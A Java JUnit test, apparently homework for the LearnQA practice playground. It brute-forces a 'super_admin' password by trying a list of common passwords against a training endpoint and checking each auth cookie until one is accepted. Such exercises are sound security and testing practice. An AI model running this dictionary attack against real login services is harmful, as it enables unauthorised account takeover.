import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class Get_password {

    @Test
    public void testGetPassword() throws InterruptedException {
        String urlGetPass = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String urlCheckAuth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String login = "super_admin";
        // Спасибо chatGPT за список уникальных паролей
        String[] passwordArray = {
                "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein", "trustno1",
                "dragon", "baseball", "111111", "iloveyou", "123123", "adobe123", "football", "welcome", "admin",
                "123456789", "princess", "1234", "1234567890", "solo", "login", "1q2w3e4r", "master", "photoshop",
                "1qaz2wsx", "ashley", "mustang", "121212", "starwars", "access", "flower", "shadow", "passw0rd",
                "michael", "!@#$%^&*", "hello", "charlie", "888888", "jesus", "password1", "superman", "696969",
                "qwertyuiop", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "batman", "zaq1zaq1",
                "whatever", "loveme", "donald", "654321", "555555", "7777777", "qwerty123", "123qwe", "000000"
        };

        System.out.println("Подбор пароля...");

        for(String pass: passwordArray){
            Thread.sleep(1000);
            String responseCookie = getCookie(login, pass, urlGetPass);
            if ((Objects.equals(checkAuth(urlCheckAuth, responseCookie), "You are authorized"))){
                System.out.println("You are authorize" + "\n" + "верный пароль: " + pass);
                break;
            }
        }
    }

    private static String checkAuth(String urlCheckAuth, String responseCookie) {
        Map<String,String> cookies = new HashMap<>();
        cookies.put("auth_cookie", responseCookie);
        Response responseForCheck = RestAssured
                .given()
                .cookies(cookies)
                .when()
                .post(urlCheckAuth)
                .andReturn();
        String response = responseForCheck.body().asString();
        cookies.clear();
        return response;
    }

    private static String getCookie(String login, String pass, String urlGetPass) {
        Response responseForGet = RestAssured
                .given()
                .body("login="+ login +"&password="+pass)
                .get(urlGetPass)
                .andReturn();
        return responseForGet.getCookie("auth_cookie");
    }
}
